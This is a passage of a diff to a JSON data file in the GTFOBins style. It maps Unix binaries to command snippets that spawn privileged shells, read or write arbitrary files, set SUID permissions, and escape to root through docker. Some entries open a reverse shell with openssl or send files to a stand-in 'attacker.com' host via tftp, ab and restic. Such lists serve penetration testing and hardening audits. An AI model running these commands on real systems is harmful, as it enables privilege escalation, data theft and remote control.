-        "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
-    ],
-    "node": [
-        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
-    ],
-    "php": [
-        "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
-    ],
-    "watch": [
-        "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
-    ],
-    "install": [
-        "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
-    ],
-    "rlwrap": [
-        "./rlwrap -H /dev/null /bin/sh -p"
-    ],
-    "basenc": [
-        "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
-    ],
-    "highlight": [
-        "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
-    ],
-    "dmsetup": [
-        "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
-    ],
-    "xz": [
-        "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
-    ],
-    "stdbuf": [
-        "./stdbuf -i0 /bin/sh -p"
-    ],
-    "julia": [
-        "./julia -e 'run(`/bin/sh -p`)'\n"
-    ],
-    "hexdump": [
-        "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
-    ],
-    "ed": [
-        "./ed file_to_read\n,p\nq\n"
-    ],
-    "paste": [
-        "LFILE=file_to_read\npaste $LFILE\n"
-    ],
-    "msgconv": [
-        "LFILE=file_to_read\n./msgconv -P $LFILE\n"
-    ],
-    "multitime": [
-        "./multitime /bin/sh -p"
-    ],
-    "agetty": [
-        "./agetty -o -p -l /bin/sh -a root tty"
-    ],
-    "base32": [
-        "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
-    ],
-    "jjs": [
-        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
-    ],
-    "xmore": [
-        "LFILE=file_to_read\n./xmore $LFILE\n"
-    ],
-    "xdotool": [
-        "./xdotool exec --sync /bin/sh -p"
-    ],
-    "setarch": [
-        "./setarch $(arch) /bin/sh -p"
-    ],
-    "ispell": [
-        "./ispell /etc/passwd\n!/bin/sh -p\n"
-    ],
-    "dd": [
-        "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
-    ],
-    "sqlite3": [
-        "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
-    ],
-    "dosbox": [
-        "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
-    ],
-    "tic": [
-        "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
-    ],
-    "rc": [
-        "./rc -c '/bin/sh -p'"
-    ],
-    "pidstat": [
-        "COMMAND=id\n./pidstat -e $COMMAND\n"
-    ],
-    "env": [
-        "./env /bin/sh -p"
-    ],
-    "base64": [
-        "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
-    ],
-    "terraform": [
-        "./terraform console\nfile(\"file_to_read\")\n"
-    ],
-    "curl": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
-    ],
-    "ncftp": [
-        "./ncftp\n!/bin/sh -p\n"
-    ],
-    "ab": [
-        "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
-    ],
-    "hd": [
-        "LFILE=file_to_read\n./hd \"$LFILE\"\n"
-    ],
-    "pg": [
-        "./pg file_to_read"
-    ],
-    "msgmerge": [
-        "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
-    ],
-    "cabal": [
-        "./cabal exec -- /bin/sh -p"
-    ],
-    "zsoelim": [
-        "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
-    ],
-    "dialog": [
-        "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
-    ],
-    "uuencode": [
-        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
-    ],
     "comm": [
         "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
-    ],
-    "chmod": [
-        "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
-    ],
-    "ssh-agent": [
-        "./ssh-agent /bin/ -p"
-    ],
-    "mawk": [
-        "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
-    ],
-    "rev": [
-        "LFILE=file_to_read\n./rev $LFILE | rev\n"
-    ],
-    "espeak": [
-        "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
-    ],
-    "nohup": [
-        "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
-    ],
-    "od": [
-        "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
-    ],
-    "time": [
-        "./time /bin/sh -p"
-    ],
-    "perf": [
-        "./perf stat /bin/sh -p\n"
-    ],
-    "rsync": [
-        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
-    ],
-    "logsave": [
-        "./logsave /dev/null /bin/sh -i -p"
-    ],
-    "bc": [
-        "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
-    ],
-    "lua": [
-        "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
-    ],
-    "msgattrib": [
-        "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
-    ],
-    "csplit": [
-        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
-    ],
-    "tee": [
-        "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
     ],
     "wc": [
         "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
     ],
-    "elvish": [
-        "./elvish"
+    "tftp": [
+        "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
     ],
-    "troff": [
-        "LFILE=file_to_read\n./troff $LFILE\n"
+    "aa-exec": [
+        "./aa-exec /bin/sh -p"
     ],
-    "setlock": [
-        "./setlock - /bin/sh -p"
+    "ss": [
+        "LFILE=file_to_read\n./ss -a -F $LFILE\n"
+    ],
+    "nawk": [
+        "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
     ],
     "fmt": [
         "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
     ],
-    "clamscan": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+    "yash": [
+        "./yash"
     ],
-    "tail": [
-        "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
+    "ispell": [
+        "./ispell /etc/passwd\n!/bin/sh -p\n"
     ],
-    "msgfilter": [
-        "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
+    "chmod": [
+        "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
     ],
-    "expect": [
-        "./expect -c 'spawn /bin/sh -p;interact'"
+    "sqlite3": [
+        "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
+    ],
+    "aspell": [
+        "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
+    ],
+    "time": [
+        "./time /bin/sh -p"
+    ],
+    "vagrant": [
+        "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+    ],
+    "strings": [
+        "LFILE=file_to_read\n./strings \"$LFILE\"\n"
+    ],
+    "nohup": [
+        "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
+    ],
+    "unshare": [
+        "./unshare -r /bin/sh"
+    ],
+    "vimdiff": [
+        "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+    ],
+    "espeak": [
+        "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
     ],
     "openssl": [
         "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
         "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
     ],
-    "unexpand": [
-        "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
-    ],
-    "scanmem": [
-        "./scanmem\nshell /bin/sh\n"
-    ],
-    "debugfs": [
-        "./debugfs\n!/bin/sh\n"
-    ],
-    "genie": [
-        "./genie -c '/bin/sh'"
-    ],
-    "gzip": [
-        "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
-    ],
-    "iconv": [
-        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
-    ],
-    "grep": [
-        "LFILE=file_to_read\n./grep '' $LFILE\n"
-    ],
-    "hping3": [
-        "./hping3\n/bin/sh -p\n"
-    ],
-    "distcc": [
-        "./distcc /bin/sh -p"
-    ],
-    "strace": [
-        "./strace -o /dev/null /bin/sh -p"
-    ],
-    "csh": [
-        "./csh -b"
+    "curl": [
+        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
     ],
     "ul": [
         "LFILE=file_to_read\n./ul \"$LFILE\"\n"
     ],
-    "genisoimage": [
-        "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
+    "eqn": [
+        "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
     ],
-    "timeout": [
-        "./timeout 7d /bin/sh -p"
+    "gdb": [
+        "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
     ],
-    "taskset": [
-        "./taskset 1 /bin/sh -p"
+    "rview": [
+        "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
     ],
-    "bridge": [
-        "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
+    "emacs": [
+        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
     ],
-    "ssh-keyscan": [
-        "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
-    ],
-    "nawk": [
-        "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
-    ],
-    "capsh": [
-        "./capsh --gid=0 --uid=0 --"
-    ],
-    "docker": [
-        "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
-    ],
-    "tclsh": [
-        "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
-    ],
-    "dash": [
-        "./dash -p"
-    ],
-    "zsh": [
-        "./zsh"
+    "diff": [
+        "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
     ],
     "join": [
         "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
     ],
-    "vagrant": [
-        "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+    "sash": [
+        "./sash"
     ],
-    "w3m": [
-        "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
+    "run-parts": [
+        "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
     ],
-    "pexec": [
-        "./pexec /bin/sh -p"
+    "ash": [
+        "./ash"
+    ],
+    "pidstat": [
+        "COMMAND=id\n./pidstat -e $COMMAND\n"
+    ],
+    "ip": [
+        "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
+        "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
+    ],
+    "genie": [
+        "./genie -c '/bin/sh'"
+    ],
+    "tac": [
+        "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
+    ],
+    "whiptail": [
+        "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+    ],
+    "awk": [
+        "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
+    ],
+    "base32": [
+        "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
+    ],
+    "cupsfilter": [
+        "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+    ],
+    "install": [
+        "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
+    ],
+    "ed": [
+        "./ed file_to_read\n,p\nq\n"
+    ],
+    "basenc": [
+        "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
+    ],
+    "rsync": [
+        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+    ],
+    "scanmem": [
+        "./scanmem\nshell /bin/sh\n"
+    ],
+    "gtester": [
+        "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+    ],
+    "unsquashfs": [
+        "./unsquashfs shell\n./squashfs-root/sh -p\n"
     ],
     "openvpn": [
         "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n",
         "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"
     ],
-    "awk": [
-        "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
+    "dmsetup": [
+        "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
+    ],
+    "make": [
+        "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+    ],
+    "rlwrap": [
+        "./rlwrap -H /dev/null /bin/sh -p"
+    ],
+    "tbl": [
+        "LFILE=file_to_read\n./tbl $LFILE\n"
+    ],
+    "hd": [
+        "LFILE=file_to_read\n./hd \"$LFILE\"\n"
+    ],
+    "less": [
+        "./less file_to_read"
+    ],
+    "genisoimage": [
+        "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
+    ],
+    "mawk": [
+        "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
+    ],
+    "lua": [
+        "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
+    ],
+    "csvtool": [
+        "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
+    ],
+    "highlight": [
+        "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
+    ],
+    "hping3": [
+        "./hping3\n/bin/sh -p\n"
+    ],
+    "choom": [
+        "./choom -n 0 -- /bin/sh -p"
+    ],
+    "rev": [
+        "LFILE=file_to_read\n./rev $LFILE | rev\n"
+    ],
+    "msgattrib": [
+        "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
+    ],
+    "msgfilter": [
+        "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
+    ],
+    "sed": [
+        "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
+    ],
+    "vigr": [
+        "./vigr"
+    ],
+    "mosquitto": [
+        "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
+    ],
+    "sort": [
+        "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
+    ],
+    "bc": [
+        "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
+    ],
+    "restic": [
+        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+    ],
+    "find": [
+        "./find . -exec /bin/sh -p \\; -quit"
+    ],
+    "sshpass": [
+        "./sshpass /bin/sh -p"
+    ],
+    "start-stop-daemon": [
+        "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
+    ],
+    "tic": [
+        "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
+    ],
+    "ionice": [
+        "./ionice /bin/sh -p"
+    ],
+    "unexpand": [
+        "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
+    ],
+    "vim": [
+        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+    ],
+    "ncftp": [
+        "./ncftp\n!/bin/sh -p\n"
+    ],
+    "xmodmap": [
+        "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
+    ],
+    "jrunscript": [
+        "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
+    ],
+    "setlock": [
+        "./setlock - /bin/sh -p"
+    ],
+    "dd": [
+        "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
+    ],
+    "jq": [
+        "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
     ],
     "arj": [
         "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n"
+    ],
+    "elvish": [
+        "./elvish"
+    ],
+    "systemctl": [
+        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
+    ],
+    "php": [
+        "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
+    ],
+    "zsoelim": [
+        "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
+    ],
+    "kubectl": [
+        "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+    ],
+    "busybox": [
+        "./busybox sh"
+    ],
+    "fish": [
+        "./fish"
+    ],
+    "cpulimit": [
+        "./cpulimit -l 100 -f -- /bin/sh -p"
+    ],
+    "gzip": [
+        "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
+    ],
+    "grep": [
+        "LFILE=file_to_read\n./grep '' $LFILE\n"
+    ],
+    "nft": [
+        "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
+    ],
+    "env": [
+        "./env /bin/sh -p"
+    ],
+    "file": [
+        "LFILE=file_to_read\n./file -f $LFILE\n"
+    ],
+    "cpio": [
+        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
+        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
+    ],
+    "debugfs": [
+        "./debugfs\n!/bin/sh\n"
+    ],
+    "ptx": [
+        "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
+    ],
+    "logsave": [
+        "./logsave /dev/null /bin/sh -i -p"
+    ],
+    "strace": [
+        "./strace -o /dev/null /bin/sh -p"
+    ],
+    "ssh-agent": [
+        "./ssh-agent /bin/ -p"
+    ],
+    "ksh": [
+        "./ksh -p"
+    ],
+    "ab": [
+        "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
+    ],
+    "base64": [
+        "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
+    ],
+    "perl": [
+        "./perl -e 'exec \"/bin/sh\";'"
+    ],
+    "msguniq": [
+        "LFILE=file_to_read\n./msguniq -P $LFILE\n"
+    ],
+    "paste": [
+        "LFILE=file_to_read\npaste $LFILE\n"
+    ],
+    "xmore": [
+        "LFILE=file_to_read\n./xmore $LFILE\n"
+    ],
+    "gimp": [
+        "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ],
+    "expand": [
+        "LFILE=file_to_read\n./expand \"$LFILE\"\n"
+    ],
+    "distcc": [
+        "./distcc /bin/sh -p"
+    ],
+    "perf": [
+        "./perf stat /bin/sh -p\n"
+    ],
+    "rtorrent": [
+        "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
+    ],
+    "dialog": [
+        "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
+    ],
+    "chroot": [
+        "./chroot / /bin/sh -p\n"
+    ],
+    "dash": [
+        "./dash -p"
+    ],
+    "uniq": [
+        "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
+    ],
+    "mv": [
+        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
+    ],
+    "alpine": [
+        "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
+    ],
+    "rc": [
+        "./rc -c '/bin/sh -p'"
+    ],
+    "xdotool": [
+        "./xdotool exec --sync /bin/sh -p"
+    ],
+    "dosbox": [
+        "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
+    ],
+    "look": [
+        "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
+    ],
+    "tclsh": [
+        "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
+    ],
+    "w3m": [
+        "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
+    ],
+    "ssh-keyscan": [
+        "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
+    ],
+    "nl": [
+        "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
+    ],
+    "capsh": [
+        "./capsh --gid=0 --uid=0 --"
+    ],
+    "head": [
+        "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
+    ],
+    "hexdump": [
+        "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
+    ],
+    "soelim": [
+        "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
+    ],
+    "expect": [
+        "./expect -c 'spawn /bin/sh -p;interact'"
+    ],
+    "julia": [
+        "./julia -e 'run(`/bin/sh -p`)'\n"
+    ],
+    "od": [
+        "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
+    ],
+    "minicom": [
+        "./minicom -D /dev/null\n"
+    ],
+    "xz": [
+        "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
+    ],
+    "ar": [
+        "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+    ],
+    "column": [
+        "LFILE=file_to_read\n./column $LFILE\n"
+    ],
+    "bridge": [
+        "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
+    ],
+    "watch": [
+        "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
+    ],
+    "agetty": [
+        "./agetty -o -p -l /bin/sh -a root tty"
+    ],
+    "terraform": [
+        "./terraform console\nfile(\"file_to_read\")\n"
+    ],
+    "pg": [
+        "./pg file_to_read"
+    ],
+    "msgcat": [
+        "LFILE=file_to_read\n./msgcat -P $LFILE\n"
+    ],
+    "ksshell": [
+        "LFILE=file_to_read\n./ksshell -i $LFILE\n"
+    ],
+    "nasm": [
+        "LFILE=file_to_read\n./nasm -@ $LFILE\n"
+    ],
+    "vipw": [
+        "./vipw"
+    ],
+    "multitime": [
+        "./multitime /bin/sh -p"
+    ],
+    "shuf": [
+        "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
+    ],
+    "csplit": [
+        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+    ],
+    "gawk": [
+        "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
+    ],
+    "node": [
+        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
+    ],
+    "ld.so": [
+        "./ld.so /bin/sh -p"
+    ],
+    "more": [
+        "./more file_to_read"
+    ],
+    "docker": [
+        "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    ],
+    "taskset": [
+        "./taskset 1 /bin/sh -p"
+    ],
+    "troff": [
+        "LFILE=file_to_read\n./troff $LFILE\n"
+    ],
+    "iconv": [
+        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
+    ],
+    "basez": [
+        "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
+    ],
+    "wget": [
+        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
+    ],
+    "cabal": [
+        "./cabal exec -- /bin/sh -p"
+    ],
+    "softlimit": [
+        "./softlimit /bin/sh -p"
+    ],
+    "jjs": [
+        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
+    ],
+    "csh": [
+        "./csh -b"
+    ],
+    "flock": [
+        "./flock -u / /bin/sh -p"
+    ],
+    "cmp": [
+        "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
+    ],
+    "arp": [
+        "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
+    ],
+    "pexec": [
+        "./pexec /bin/sh -p"
+    ],
+    "setfacl": [
+        "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
+    ],
+    "readelf": [
+        "LFILE=file_to_read\n./readelf -a @$LFILE\n"
+    ],
+    "python": [
+        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ],
+    "nmap": [
+        "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
+    ],
+    "clamscan": [
+        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+    ],
+    "nm": [
+        "LFILE=file_to_read\n./nm @$LFILE\n"
+    ],
+    "date": [
+        "LFILE=file_to_read\n./date -f $LFILE\n"
+    ],
+    "msgmerge": [
+        "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
+    ],
+    "rvim": [
+        "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+    ],
+    "tee": [
+        "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
+    ],
+    "pandoc": [
+        "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
+    ],
+    "bzip2": [
+        "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
+    ],
+    "atobm": [
+        "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+    ],
+    "view": [
+        "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+    ],
+    "cat": [
+        "LFILE=file_to_read\n./cat \"$LFILE\"\n"
+    ],
+    "xxd": [
+        "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
+    ],
+    "sysctl": [
+        "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+    ],
+    "dig": [
+        "LFILE=file_to_read\n./dig -f $LFILE\n"
+    ],
+    "cut": [
+        "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
+    ],
+    "ssh-keygen": [
+        "./ssh-keygen -D ./lib.so"
+    ],
+    "unzip": [
+        "./unzip -K shell.zip\n./sh -p\n"
+    ],
+    "setarch": [
+        "./setarch $(arch) /bin/sh -p"
+    ],
+    "pr": [
+        "LFILE=file_to_read\npr -T $LFILE\n"
+    ],
+    "zsh": [
+        "./zsh"
+    ],
+    "msgconv": [
+        "LFILE=file_to_read\n./msgconv -P $LFILE\n"
+    ],
+    "timeout": [
+        "./timeout 7d /bin/sh -p"
     ],
     "cp": [
         "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
         "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
         "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
     ],
-    "gimp": [
-        "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    "stdbuf": [
+        "./stdbuf -i0 /bin/sh -p"
     ],
-    "chroot": [
-        "./chroot / /bin/sh -p\n"
+    "xargs": [
+        "./xargs -a /dev/null sh -p"
     ],
-    "xmodmap": [
-        "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
+    "gcore": [
+        "./gcore $PID"
     ],
-    "pandoc": [
-        "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
+    "uudecode": [
+        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
     ],
-    "perl": [
-        "./perl -e 'exec \"/bin/sh\";'"
-    ],
-    "sort": [
-        "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
-    ],
-    "cat": [
-        "LFILE=file_to_read\n./cat \"$LFILE\"\n"
-    ],
-    "nft": [
-        "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
-    ],
-    "msgcat": [
-        "LFILE=file_to_read\n./msgcat -P $LFILE\n"
-    ],
-    "unzip": [
